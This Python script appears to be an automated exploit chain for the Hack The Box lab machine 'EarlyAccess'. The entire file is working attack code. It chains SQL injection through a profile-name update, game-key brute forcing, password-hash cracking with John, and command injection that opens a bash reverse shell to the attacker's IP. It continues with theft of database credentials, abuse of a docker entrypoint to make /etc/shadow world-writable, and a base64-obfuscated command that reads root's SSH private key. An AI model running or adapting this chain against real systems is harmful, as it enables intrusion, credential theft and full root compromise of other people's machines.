#!/usr/bin/python3
import pexpect
import paramiko
import requests
import time
from pwn import *
import pdb
import sys
import json
from itertools import product
import multiprocessing



requests.packages.urllib3.disable_warnings()

# Variables Globales
name = "pr1ngl3s"
email = "pr1ngl3s@pr1ngl3s.com"
password = "pr1ngl3s123"
password2 = "pr1ngl3s123"
url_login = "https://earlyaccess.htb/login"
url_key = "https://earlyaccess.htb/key"
MyIP="10.10.14.13"

s = requests.session()


r = s.get(url_login, verify=False)

token = re.findall('name="_token" value="(.*?)"',r.text)[0]

def calc_g3():
	r = product(string.ascii_uppercase, repeat=2)

	r2 = [ "".join(x) for x in r ]


	com = {}

	for x in r2:
		for i in range(0,10):
			key = f"XP{x}{i}"

			value = sum(bytearray(key.encode()))

			com[value] = key

	return com.values()


def checksum_calc(key):
	gs = key.split('-')[:]
	return sum([sum(bytearray(g.encode())) for g in gs])

def Key_Gen():
	values = calc_g3()

	total_keys = []

	for x in values:
		key = f"KEY98-KY5Z3-{x}-GAML8-"
		cs = checksum_calc(key)
		key = key + str(cs)

		total_keys.append(key)

	try_keys(total_keys)

def try_keys(keys):

	key_verify_url = "https://earlyaccess.htb/key/add"

	cont = 1

	for key in keys:

		url_token = "https://earlyaccess.htb/login"

		r = s.get(url_key, verify=False)

		token = re.findall('name="_token" value="(.*?)"',r.text)[0]

		data_post = {
			'_token': token,
			'key': key
		}

		r = s.post(key_verify_url, verify=False, data=data_post)

#		time.sleep(1)

		if "Game-key is invalid!" not in r.text:
			break

		cont += 1

def Register():

	url_register = "https://earlyaccess.htb/register"

	r = s.get(url_register, verify=False)

	token = re.findall('name="_token" value="(.*?)"',r.text)[0]

	data_post = {
		'_token': token,
		'name': name,
		'email': email,
		'password': password,
		'password_confirmation': password2
	}

	r = s.post(url_register, data=data_post, verify=False)


def Login():
	url_login = "https://earlyaccess.htb/login"

	data_post = {
		'_token': token,
		'email': email,
		'password': password
	}

	r = s.post(url_login, data=data_post, verify=False)

def Update_name(old_name,new_name):
	url_update = "https://earlyaccess.htb/livewire/message/profile.update-profile-information-form"

	url_profile = "https://earlyaccess.htb/user/profile"

	r = s.get(url_profile, verify=False)

	token = re.findall('name="_token" value="(.*?)"',r.text)[0]

	id = re.findall('id&quot;:&quot;(.*?)&quot;', r.text)[1]

	data_id = int(re.findall('state&quot;:{&quot;id&quot;:(.*?),&quot;',r.text)[0])

	htmlHash = re.findall('htmlHash&quot;:&quot;(.*?)&quot;', r.text)[1]

	checksum = re.findall('checksum&quot;:&quot;(.*?)&quot;', r.text)[1]

	created_at = re.findall('created_at&quot;:&quot;(.*?)&quot;', r.text)[0]

	updated_at = re.findall('updated_at&quot;:&quot;(.*?)&quot;', r.text)[0]

	headers = {"Content-Type":"application/json","X-Csrf-Token":token}

	data_post = {
	    "fingerprint":{
	        "id":id,
	        "name":"profile.update-profile-information-form",
	        "locale":"en",
	        "path":"user/profile",
	        "method":"GET"
	    },
	    "serverMemo":{
	        "children":[],
	        "errors":[],
	        "htmlHash":htmlHash,
	        "data":{
	            "state":{
	                "id":data_id,
	                "name":old_name,
	                "email":"pr1ngl3s@pr1ngl3s.com",
	                "role":"user",
	                "key":None,
	                "created_at":created_at,
	                "updated_at":updated_at
	            },
	            "photo":None
	        },
	        "dataMeta":[],
	        "checksum":checksum
	    },
	    "updates":[
	        {
	            "type":"syncInput",
	            "payload":{
	                "name":"state.name",
	                "value": new_name
	            }
	        },
	        {
	            "type":"callMethod",
	            "payload":{
	                "method":"updateProfileInformation",
	                "params":[]
	            }
	        }
	    ]
	}

	r = s.post(url_update, data=json.dumps(data_post),headers=headers, verify=False)


def GetPassAdmin():

	url_game_login = "http://game.earlyaccess.htb/actions/login.php"

	url_set_score = "http://game.earlyaccess.htb/actions/score.php?score=0"

	url_scoreboard = "http://game.earlyaccess.htb/scoreboard.php"


	data_post = {
		'email': email,
		'password': password
	}

	r = s.post(url_game_login, data=data_post, verify=False)

	r = s.get(url_set_score, verify=False)

	r = s.get(url_scoreboard, verify=False)

	hash = re.findall('<tbody><tr><td>(.*?)</td>', r.text)[0]

	return crack_hash(hash)

def crack_hash(hash):

	with open('hash', 'w') as file:
		file.write(hash)


	os.system("john -w=/usr/share/wordlists/rockyou.txt hash > pass 2>/dev/null; cat pass | grep \"(?)\" | cut -d' ' -f1 | sponge pass")

	with open('pass', 'r') as file:

		Pass = file.read()

	return Pass.replace('\n','')

def Login_admin(pass_admin):
	url_login_admin = "http://dev.earlyaccess.htb/actions/login.php"

	data_post = {
		'password': pass_admin
	}

	r = s.post(url_login_admin,data=data_post)

def Send_Shell():

	url_hash = "http://dev.earlyaccess.htb/actions/hash.php"

	data_post = {
		'action': 'hash',
		'redirect': 'true',
		'password': f"bash -c 'bash -i >& /dev/tcp/{MyIP}/443 0>&1'",
		'hash_function': 'system',
		'debug': 'test'
	}

	r = s.post(url_hash, data=data_post)


def Get_Shell():
	with listen('443', timeout=20) as shell:
		shell.sendline("cd /tmp".encode('utf-8'))
		shell.sendline("su www-adm".encode('utf-8'))
		time.sleep(1)
		shell.sendline(f"{pass_admin}".encode('utf-8'))
		shell.sendline("wget http://172.18.0.101:5000/check_db".encode('utf-8'))
		time.sleep(1)
		shell.sendline("cat check_db".encode('utf-8'))


		# Usar recv() en un bucle para recibir datos en fragmentos hasta que se reciba toda la información necesaria.
		datos_recibidos = b""

		while True:
			datos = shell.recv(4096)
			if not datos:
				break
			datos_recibidos += datos

		with open('check_db', 'wb') as f:
			f.write(datos_recibidos)

def Get_Credentials():

	with open('check_db', 'r') as file:
		check_db = file.read()

	os.remove("check_db")

	return	re.findall(r'\"MYSQL_USER=(.*?)\"', check_db)[0],re.findall(r'\"MYSQL_ROOT_PASSWORD=(.*?)\"', check_db)[0]


def Drew(username,password):
	client = paramiko.SSHClient()

	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	client.connect('10.10.11.110', username=username, password=password)

	client.exec_command("while true; do echo 'chmod 777 /etc/shadow' > /opt/docker-entrypoint.d/test; chmod +x /opt/docker-entrypoint.d/test; sleep 1;done")

	sleep(10)

	client.close()

def Game_Tester2(username,password):
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	client.connect('10.10.11.110', username=username, password=password)

	stdin, stdout, stderr = client.exec_command('ssh -o StrictHostKeyChecking=no game-tester@$(for x in $(seq 2 254); do ((ping -c 1 172.19.0.$x 1>/dev/null) && echo '' > /dev/tcp/172.19.0.$x/22 && echo "172.19.0.$x" &); done 2>/dev/null) "curl http://127.0.0.1:9999/autoplay -d \'rounds=-1\'"')

def Get_Hash_Adm(username,password):
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	client.connect('10.10.11.110', username=username, password=password)

	stdin, stdout, stderr = client.exec_command('ssh -o StrictHostKeyChecking=no game-tester@$(for x in $(seq 2 254); do ((ping -c 1 172.19.0.$x 1>/dev/null) && echo '' > /dev/tcp/172.19.0.$x/22 && echo "172.19.0.$x" &); done 2>/dev/null) "cat /etc/shadow | grep \'game-adm\' | cut -d\':\' -f2"')

	Hash_Adm = stdout.read().decode('utf-8')

	with open('hash_adm', 'w') as f:
            f.write(Hash_Adm)

	client.close()


def GetID_RSA(username,password, username_adm, password_adm):
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	client.connect("10.10.11.110", username=username, password=password)

	stdin, stdout, stderr = client.exec_command(f'su {username_adm} -c "echo \"L3Vzci9zYmluL2FycCAtZiAtdiAnL3Jvb3QvLnNzaC9pZF9yc2EnIDI+JjEgfCBncmVwIC12RSAnYXJwfGZvcm1hdHxob3N0JyB8IHNlZCAncy8+PiAvLycK\" | base64 -d | bash"')
	time.sleep(1)
	stdin.write(f'{password_adm}\n')

	id_rsa = stdout.read().decode('utf-8')

	with open('id_rsa', 'w') as f:
            f.write(id_rsa)


def GetRoot_Shell():
	ssh_command = "ssh -i id_rsa root@10.10.11.110 -o StrictHostKeyChecking=no"

	ssh_session = pexpect.spawn(ssh_command, timeout=None)

	ssh_session.interact()


if __name__ == "__main__":

	log.info("Crackeando el hash del usuario 'admin'...")

	Register()

	Login()

	Update_name("pr1ngl3s","') union select name,email,password from users-- -")

	Key_Gen()

	pass_admin = GetPassAdmin()

	os.remove("hash")

	os.remove("pass")

	os.remove("/root/.john/john.log")

	os.remove("/root/.john/john.pot")

	Login_admin(pass_admin)

	multiprocessing.Process(target=Send_Shell).start()

	log.info("Obteniendo la contraseña del usuario 'drew'...")

	Get_Shell()

	User_drew, Pass_drew = Get_Credentials()

	multiprocessing.Process(args=(User_drew,Pass_drew,),target=Drew).start()

	Game_Tester2(User_drew, Pass_drew)

	time.sleep(40)

	log.info("Crackeando la contraseña del usuario 'game-adm'...")

	Get_Hash_Adm(User_drew, Pass_drew)

	os.system("john -w=/usr/share/wordlists/rockyou.txt hash_adm > pass 2>/dev/null; cat pass | grep \"(?)\" | cut -d' ' -f1 | sponge pass")

	with open('pass', 'r') as file:
		Pass_Adm = file.read()

	os.remove("hash_adm")

	os.remove("pass")

	log.info("Obteniendo la clave privada del usuario 'root'...")

	GetID_RSA(User_drew, Pass_drew, "game-adm", Pass_Adm)

	os.system('chmod 600 id_rsa')

	GetRoot_Shell()

	os.remove('id_rsa')


